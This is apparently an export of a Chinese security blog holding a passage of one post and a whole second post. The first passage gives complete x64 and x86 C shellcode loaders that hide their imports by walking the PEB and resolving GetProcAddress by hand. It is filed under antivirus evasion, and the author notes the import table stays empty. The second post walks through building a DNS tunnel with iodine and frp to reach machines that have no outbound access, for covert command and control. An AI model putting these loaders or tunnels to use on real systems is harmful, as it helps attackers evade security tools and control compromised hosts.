<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明自定义函数，extern &quot;C&quot; 表示使用 C语言的调用约定</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">PVOID64 __stdcall <span class="title">GetInInitializationOrderModuleList</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 Kernel32 地址</span></span><br><span class="line"><span class="function">HMODULE <span class="title">GetKernel32Address</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 InInitializationOrderModuleList</span></span><br><span class="line">    LIST_ENTRY* node = (LIST_ENTRY*)GetInInitializationOrderModuleList(); <span class="comment">// LIST_ENTRY 是双向链表结构体</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历 InInitializationOrderModuleList</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        UNICODE_STRING* fullDllName = (UNICODE_STRING*)((BYTE*)node + <span class="number">0x38</span>); <span class="comment">// x86 偏移量是 0x24</span></span><br><span class="line">        <span class="keyword">if</span> (*(fullDllName-&gt;Buffer + <span class="number">12</span>) == <span class="string">&#x27;\0&#x27;</span>) &#123; <span class="comment">// 模块完整名称是 KERNEL32.DLL\0</span></span><br><span class="line">            <span class="keyword">return</span> (HMODULE)(*((ULONG64*)((BYTE*)node + <span class="number">0x10</span>))); <span class="comment">// 返回模块基址(DllBase)</span></span><br><span class="line">        &#125;</span><br><span class="line">        node = node-&gt;Flink; <span class="comment">// 下一个节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 GetProcAddress 函数地址</span></span><br><span class="line"><span class="function">DWORD64 <span class="title">GetGetProcAddress</span><span class="params">(HMODULE hKernal32)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 Kernel32.dll DOS头</span></span><br><span class="line">    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hKernal32;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 NT头</span></span><br><span class="line">    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((LONG64)dos + dos-&gt;e_lfanew); <span class="comment">// x64 指针是8字节，e_lfanew 是 DWORD 是4字节，所以要转 LONG64</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取导出表</span></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LONG64)dos + nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 函数的地址为ULONG，所以用PULONG指针</span></span><br><span class="line">    PULONG RVAFunctions = (PULONG)((LONG64)dos + exportDir-&gt;AddressOfFunctions); <span class="comment">// 获取导出函数的RVA(相对虚拟地址)数组地址</span></span><br><span class="line">    PULONG RVANames = (PULONG)((LONG64)dos + exportDir-&gt;AddressOfNames); <span class="comment">// 获取导出函数名RVA数组地址</span></span><br><span class="line">    PUSHORT AddressOfNameOrdinals = (PUSHORT)((LONG64)dos + exportDir-&gt;AddressOfNameOrdinals); <span class="comment">// 获取导出函数序号数组地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历导出函数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">        PUCHAR functionName = (PUCHAR)((LONG64)dos + RVANames[i]); <span class="comment">// 获取当前函数名地址</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)functionName, <span class="string">&quot;GetProcAddress&quot;</span>)) &#123; <span class="comment">// 函数名是 GetProcAddress</span></span><br><span class="line">            <span class="keyword">return</span> (ULONG64)((LONG64)dos + RVAFunctions[(USHORT)AddressOfNameOrdinals[i]]); <span class="comment">// 返回当前函数地址</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义函数指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* pGetProcAddress)</span><span class="params">(HMODULE, LPCSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pVirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* pCreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pWaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;ShellCode&quot;</span>;</span><br><span class="line"></span><br><span class="line">    HMODULE hKernal32 = GetKernel32Address(); <span class="comment">// 获取 Kernel32 地址</span></span><br><span class="line">    pGetProcAddress GetProcAddress = (pGetProcAddress)GetGetProcAddress(hKernal32); <span class="comment">// 获取 GetProcAddress 函数地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取必要函数地址</span></span><br><span class="line">    pVirtualProtect VirtualProtect = (pVirtualProtect)GetProcAddress(hKernal32, <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">    pCreateThread CreateThread = (pCreateThread)GetProcAddress(hKernal32, <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">    pWaitForSingleObject WaitForSingleObject = (pWaitForSingleObject)GetProcAddress(hKernal32, <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载 ShellCode</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    VirtualProtect((LPVOID)buf, <span class="keyword">sizeof</span> buf, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>都有详细的注释不错。</p>
<p>接下来实践一下执行shellcode</p>
<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122001700455.png" alt="image-20240122001700455"></p>
<p>成功了</p>
<p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122002614109.png" alt="image-20240122002614109"></p>
<p>导入表中没有信息</p>
<h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength;</span><br><span class="line">    PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING, * PUNICODE_STRING;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    UINT32 SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    UNICODE_STRING BaseDllName;</span><br><span class="line">    UINT32 Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    LIST_ENTRY HashLinks;</span><br><span class="line">    PVOID SectionPointer;</span><br><span class="line">    UINT32 CheckSum;</span><br><span class="line">    UINT32 TimeDateStamp;</span><br><span class="line">    PVOID LoadedImports;</span><br><span class="line">    PVOID EntryPointActivationContext;</span><br><span class="line">    PVOID PatchInformation;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 获取 Kernel32 地址，与 x64 不同</span></span><br><span class="line"><span class="function">HMODULE <span class="title">GetKernel32Address</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 InLoadOrderModuleList</span></span><br><span class="line">    LDR_DATA_TABLE_ENTRY* node = <span class="literal">NULL</span>;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, fs: [<span class="number">0x30</span>] <span class="comment">// PEB</span></span><br><span class="line">        mov eax, [eax + <span class="number">0x0C</span>] <span class="comment">// PEB_LDR_DATA</span></span><br><span class="line">        mov eax, [eax + <span class="number">0x0C</span>] <span class="comment">// InLoadOrderModuleList</span></span><br><span class="line">        mov node, eax</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 遍历 InLoadOrderModuleList</span></span><br><span class="line">    <span class="keyword">char</span> kernel32Name[] = &#123; <span class="string">&#x27;K&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;E&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;R&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;N&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;E&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;L&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;3&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;2&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;.&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;D&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;L&#x27;</span>,<span class="number">0</span>,<span class="string">&#x27;L&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;; <span class="comment">// unicode \0 结尾</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)node-&gt;BaseDllName.Buffer, kernel32Name)) &#123; <span class="comment">// 模块名是 KERNEL32.DLL\0</span></span><br><span class="line">            <span class="keyword">return</span> (HMODULE)node-&gt;DllBase; <span class="comment">// 返回模块基址</span></span><br><span class="line">        &#125;</span><br><span class="line">        node = (LDR_DATA_TABLE_ENTRY*)node-&gt;InLoadOrderLinks.Flink; <span class="comment">// 下一个节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 获取 GetProcAddress 函数地址，同 x64</span></span><br><span class="line"><span class="function">DWORD64 <span class="title">GetGetProcAddress</span><span class="params">(HMODULE hKernal32)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 获取 Kernel32.dll DOS头</span></span><br><span class="line">    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hKernal32;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取 NT头</span></span><br><span class="line">    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((LONG64)dos + dos-&gt;e_lfanew); <span class="comment">// x64 指针是8字节，e_lfanew 是 DWORD 是4字节，所以要转 LONG64</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取导出表</span></span><br><span class="line">    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LONG64)dos + nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 函数的地址为ULONG，所以用PULONG指针</span></span><br><span class="line">    PULONG RVAFunctions = (PULONG)((LONG64)dos + exportDir-&gt;AddressOfFunctions); <span class="comment">// 获取导出函数的RVA(相对虚拟地址)数组地址</span></span><br><span class="line">    PULONG RVANames = (PULONG)((LONG64)dos + exportDir-&gt;AddressOfNames); <span class="comment">// 获取导出函数名RVA数组地址</span></span><br><span class="line">    PUSHORT AddressOfNameOrdinals = (PUSHORT)((LONG64)dos + exportDir-&gt;AddressOfNameOrdinals); <span class="comment">// 获取导出函数序号数组地址</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 遍历导出函数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; exportDir-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">        PUCHAR functionName = (PUCHAR)((LONG64)dos + RVANames[i]); <span class="comment">// 获取当前函数名地址</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)functionName, <span class="string">&quot;GetProcAddress&quot;</span>)) &#123; <span class="comment">// 函数名是 GetProcAddress</span></span><br><span class="line">            <span class="keyword">return</span> (ULONG64)((LONG64)dos + RVAFunctions[(USHORT)AddressOfNameOrdinals[i]]); <span class="comment">// 返回当前函数地址</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 定义函数指针类型</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI* pGetProcAddress)</span><span class="params">(HMODULE, LPCSTR)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(WINAPI* pVirtualProtect)</span><span class="params">(LPVOID, DWORD, DWORD, PDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span><span class="params">(WINAPI* pCreateThread)</span><span class="params">(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* pWaitForSingleObject)</span><span class="params">(HANDLE, DWORD)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = <span class="string">&quot;ShellCode&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    HMODULE hKernal32 = GetKernel32Address(); <span class="comment">// 获取 Kernel32 地址</span></span><br><span class="line">    pGetProcAddress GetProcAddress = (pGetProcAddress)GetGetProcAddress(hKernal32); <span class="comment">// 获取 GetProcAddress 函数地址</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 获取必要函数地址</span></span><br><span class="line">    pVirtualProtect VirtualProtect = (pVirtualProtect)GetProcAddress(hKernal32, <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">    pCreateThread CreateThread = (pCreateThread)GetProcAddress(hKernal32, <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">    pWaitForSingleObject WaitForSingleObject = (pWaitForSingleObject)GetProcAddress(hKernal32, <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 加载 ShellCode</span></span><br><span class="line">    DWORD oldProtect;</span><br><span class="line">    VirtualProtect((LPVOID)buf, <span class="keyword">sizeof</span> buf, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class="line">    HANDLE hThread = CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)(LPVOID)buf, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="将shellcode存储在资源里"><a href="#将shellcode存储在资源里" class="headerlink" title="将shellcode存储在资源里"></a>将shellcode存储在资源里</h2><p><img src="/2024/01/22/C%E8%AF%AD%E8%A8%803-IAT%E8%A1%A8%E3%80%81shellcode-loader/image-20240122005256903.png" alt="image-20240122005256903"></p>
]]></content>
      <categories>
        <category>-miansha</category>
      </categories>
  </entry>
  <entry>
    <title>DNS隧道基础</title>
    <url>/2022/12/28/DNS%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="DNS隧道基础"><a href="#DNS隧道基础" class="headerlink" title="DNS隧道基础"></a>DNS隧道基础</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DNS隧道，是隧道技术中的一种。当我们的HTTP、HTTPS这样的上层协议、正反向端口转发都失败的时候，可以尝试使用DNS隧道。DNS隧道很难防范，因为平时的业务也好，使用也罢，难免会用到DNS协议进行解析，所以防火墙大多对DNS的流量是放行状态。这时候，如果我们在不出网机器构造一个恶意的域名（***.xxx.ga），本地的DNS服务器无法给出回答时，就会以迭代查询的方式通过互联网定位到所查询域的权威DNS服务器。最后，这条DNS请求会落到我们提前搭建好的恶意DNS服务器上，于是乎，我们的不出网主机就和恶意DNS服务器交流上了。</span><br></pre></td></tr></table></figure>

<p><strong>搭建DNS隧道的工具目前有iodine，dnscat，dns2tcp等</strong>。</p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="DNS的集中资源记录类型"><a href="#DNS的集中资源记录类型" class="headerlink" title="DNS的集中资源记录类型"></a>DNS的集中资源记录类型</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.主机记录（A记录）</span><br><span class="line">主机记录可以将DNS中的域名称对应到IPv4地址。</span><br><span class="line">2.PTR</span><br><span class="line">PTR可以定义某个对应的域名。</span><br><span class="line">3.CNAME记录，通常称别名解析</span><br><span class="line">CNAME记录可以将注册的不同域名都转到一个域名记录上，由这个域名记录同意解析管理，与A记录不同的是，CNAME别名记录设置的可以是一个域名的描述而不一定是IP地址。</span><br><span class="line">4.NS（Name Server）记录是域名服务器记录</span><br><span class="line">NS记录用来置顶该域名是由那个DNS服务器来进行解析的，可以吧一个域名的不同二级域名分别只想到不同的DNS系统来解析。</span><br><span class="line">5.TXT记录</span><br><span class="line">TXT记录一般是为某条记录设置说明，比如你新建了一条a.com的TXT记录，TXT记录内容“this is a test TXT record&quot;的字样了。</span><br></pre></td></tr></table></figure>

<h2 id="DNS协议解析过程"><a href="#DNS协议解析过程" class="headerlink" title="DNS协议解析过程"></a>DNS协议解析过程</h2><p>dns协议解析过程分为两种，迭代查询和递归查询。</p>
<p>迭代查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地域名服务器像根域名服务器发送请求报文，根域名服务器直接给出ip地址或者告诉本地域名服务器下一步应该去向另一个域名服务器A进行查询。同理,A域名服务器直接给出ip地址或者告诉本地域名服务器下一步应该去查询B域名服务器。过程以此类推，知道找到ip地址为止。</span><br></pre></td></tr></table></figure>

<p>递归查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户机向本地域名服务器查询，如果本地域名服务器的缓存中没有需要查询的ip地址，那么本地域名服务器会以客户机的身份（代替本机查询），向根域名服务器发送请求报文。</span><br></pre></td></tr></table></figure>

<h2 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h2><p>DNS隧道是隐蔽信道的一种，通过将其他协议封装在DNS协议中进行通信。封装由客户端完成，将DNS流量还原成正常的流量由服务器完成。DNS隧道攻击利用了防火墙放行DNS单特点以及协议解析流程来实现的。</p>
<p>而DNS隧道也要分为两种，一种是直连型，一种是域名型DNS隧道（中继）。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">直连型DNS隧道：</span><br><span class="line">客户端直接和指定的目标DNS Server进行UDPsocket套接字连接，通过将数据编码封装在DNS协议中进行通信，这种方式速度快，但是隐蔽性比较弱，很容易被探测到，但如果客户端指定了信任的DNS解析服务器，那么将会被白名单限制在外。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">域名型DNS隧道（中继）：</span><br><span class="line">通过DNS迭代查询实现的中继隧道，比较隐蔽，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上较直连慢很多。中继过程中的一个关键点是对DNS缓存机制的规避，因为如果解析的域名在Local DNS 中已经有缓存，那么Local DNS 就不会继续发送数据包，所以在构造请求中，每次查询的域名需要不同或者是已过期的。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DNS隧道建立的过程：</span><br><span class="line">Step 1：受控PC机将数据封装进DNS数据包里，像局域网内部的本地域名服务器请求查询aaa.com</span><br><span class="line">Step 2：本地域名服务器透过防火墙向根域名服务器发送查询请求</span><br><span class="line">Step 3：经过大量重定向，查询请求最终要aaa.com的权威域名服务器</span><br><span class="line">Step 4：aaa.com权威域名服务器是在攻击者的控制下，解析发送过来的DNS数据包并发送回应包</span><br><span class="line">Step 5：DNS回应包穿透防火墙</span><br><span class="line">Step 6：DNS回应包进入内网</span><br><span class="line">Step 7：本地域名服务器将回应包返回给受控PC机</span><br><span class="line">Step 8：受控PC机解析DNS回应包里的数据，得到新的指令</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DNS Beacon原理：</span><br><span class="line">利用DNS请求应答机制作为攻击渗透到命令控制通道，吧C&amp;C服务器指令封装到DNS相应报文中，以此控制被控段主机。</span><br></pre></td></tr></table></figure>

<p>发送端将隐蔽数据信息切分并且编码后封装到DNS报文域名中进行传输，每一级域名长度为63，域名总长度不超过253，接收端收到DNS报文后提取域名中的隐蔽信息字段进行解码重组还原得到IP报文。主要的工具有DNSCat,Iodine等</p>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><p>需要一个域名和一个公网服务器。</p>
<h2 id="iodine-DNS隧道搭建"><a href="#iodine-DNS隧道搭建" class="headerlink" title="iodine DNS隧道搭建"></a>iodine DNS隧道搭建</h2><p>值得一提到是iodine（碘）的原子序数为53，这恰好是DNS端口号，故取名为iodine。</p>
<p><code>apt install iodine</code>命令会同时安装服务端与客户端。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnspod：https://www.dnspod.cn，在dnspod中添加刚申请的域名，然后dnspod会给出两条dns服务器地址。</span><br><span class="line"></span><br><span class="line">前往域名注册商处修改为 DNSPod 所属服务器。(阿里云中</span><br><span class="line">dns修改后有24-48小时dns生效时间。)</span><br></pre></td></tr></table></figure>

<p>等了一天DNS生效，继续配置。</p>
<p>dnspod得到域名的管理权之后，在里面添加两条解析记录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一条A类记录，告诉域名系统，&quot;www.xxx&quot;的IP地址是&quot;121.xxx.xxx.xxx&quot;。</span><br><span class="line"></span><br><span class="line">第二条NS记录，告诉域名系统，&quot;ns.xxx&quot;的域名由&quot;www.xxx&quot;进行解析。</span><br><span class="line"></span><br><span class="line">到此前期准备工作就已经完成了，已经将域名绑定到了我们的公网服务器上。</span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/28/DNS%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221228151559428.png" alt="image-20221228151559428"></p>
<p>但是更改之后，也不会马上生效，需要等待一段时间，等各地的运营商的缓存刷新才可以。</p>
<h3 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h3><p>在公网服务器上部署iodine服务端。(需要root权限运行)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iodined -f -c -P 123.com 192.168.200.1 ns.xxx -DD</span><br><span class="line"></span><br><span class="line">\-f：在前台运行</span><br><span class="line"></span><br><span class="line">\-c：禁止检查所有传入请求的客户端IP地址。</span><br><span class="line"></span><br><span class="line">\-P：客户端和服务端之间用于验证身份的密码。</span><br><span class="line"></span><br><span class="line">\-D：指定调试级别，-DD指第二级。“D”的数量随级别增加。</span><br></pre></td></tr></table></figure>

<p>其中ns.xxx就是在腾讯dns设置的ns记录那个</p>
<p>这里的192.168.200.1为自定义局域网虚拟IP地址，建议不要与现有网段冲突。</p>
<p>执行完该命令之后会新生成一个dns0虚拟网卡，ip地址就是刚才命令中输入的ip地址(192.168.200.1)。</p>
<p><img src="/2022/12/28/DNS%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221228162144458.png" alt="image-20221228162144458"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">**ubuntu默认53端口是打开的，通过下面命令关闭掉53端口**</span><br><span class="line"></span><br><span class="line">rm /etc/resolv.conf&amp;&amp;echo &quot;nameserver x.x.x.x&quot; &gt;&gt; /etc/resolv.conf 配置dns服务器(x.x.x.x改为dns服务器,8.8.8.8等)</span><br><span class="line"></span><br><span class="line">systemctl stop systemd-resolved 停止该进程</span><br><span class="line"></span><br><span class="line">systemctl disable systemd-resolved 关闭开机自启动</span><br></pre></td></tr></table></figure>

<h3 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">客户端我使用的kali，kali自带iodine工具。</span><br><span class="line"></span><br><span class="line">iodine -f -P 123.com ns.xxx -M 200</span><br><span class="line"></span><br><span class="line">-r：iodine有时会自动将DNS隧道切换为UDP隧道，该参数的作用是强制在任何情况下使用DNS隧道</span><br><span class="line"></span><br><span class="line">-M：指定上行主机的大小。</span><br><span class="line"></span><br><span class="line">-m：调节最大下行分片的大小。</span><br><span class="line"></span><br><span class="line">-f：在前台运行</span><br><span class="line"></span><br><span class="line">-T：指定DNS请求类型TYPE，可选项有NULL、PRIVATE、TXT、SRV、CNAME、MX、A。</span><br><span class="line"></span><br><span class="line">-O：指定数据编码规范。</span><br><span class="line"></span><br><span class="line">-P：客户端和服务端之间用于验证身份的密码。</span><br><span class="line"></span><br><span class="line">-L：指定是否开启懒惰模式，默认开启。</span><br><span class="line"></span><br><span class="line">-I：指定两个请求之间的时间间隔。</span><br></pre></td></tr></table></figure>

<p>值得注意的是：dns服务使用的是udp的53端口，而不是tcp的。</p>
<p>同时即使链接成功了也会产生编码错误，在客户端使用如下命令解决。</p>
<p><code>iodine -f -P 123.com ns.xxx  -M 200 -O base64</code></p>
<p><img src="/2022/12/28/DNS%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221228171835939.png" alt="image-20221228171835939"></p>
<p>这边已经链接成功了，而且也给我们分配了一个虚拟ip,200.3</p>
<p>现在我们通过客户端ping一下服务端的虚拟ip，发现ping的通，则dns隧道建立成功。</p>
<p><img src="/2022/12/28/DNS%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221228172735624.png" alt="image-20221228172735624"></p>
<p>（就是延迟有点高的啊）</p>
<h3 id="frp搭建隧道"><a href="#frp搭建隧道" class="headerlink" title="frp搭建隧道"></a>frp搭建隧道</h3><p>先在服务器上打开frp</p>
<p><img src="/2022/12/28/DNS%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221228173805409.png" alt="image-20221228173805409"></p>
<p>随后在本地搭建frp客户端</p>
<p><img src="/2022/12/28/DNS%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221228174532671.png" alt="image-20221228174532671"></p>
<p>注意，这里的ip就不是公网上的了，而是dns隧道中服务器的虚拟ip，现在我们相当于在6005端口中又嵌套了一个socket隧道。（上面配置搞忘打一个中括号了，记得加上）</p>
<p><img src="/2022/12/28/DNS%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221228175259660.png" alt="image-20221228175259660"></p>
<p>直接访问公网的6005端口</p>
<p><img src="/2022/12/28/DNS%E9%9A%A7%E9%81%93%E5%9F%BA%E7%A1%80/image-20221228175505332.png" alt="image-20221228175505332"></p>
<p>可以看到成功建立链接，就是有点小慢（毕竟是dns隧道。</p>
<p>为了做实验，我还专门吧服务器的其他端口用防火墙拦截了，只留下了一个dns的端口，结果还是成功的。（当然对面的服务器必须把你开socket代理的端口打开才可以哦，是tcp的，）</p>
<p>当然后续还有一些工具可以搭建dns隧道，后面我的博客中会陆续补充在工具分类里面。（<strong>dnscat2</strong>、<strong>dns2tcp</strong>）</p>
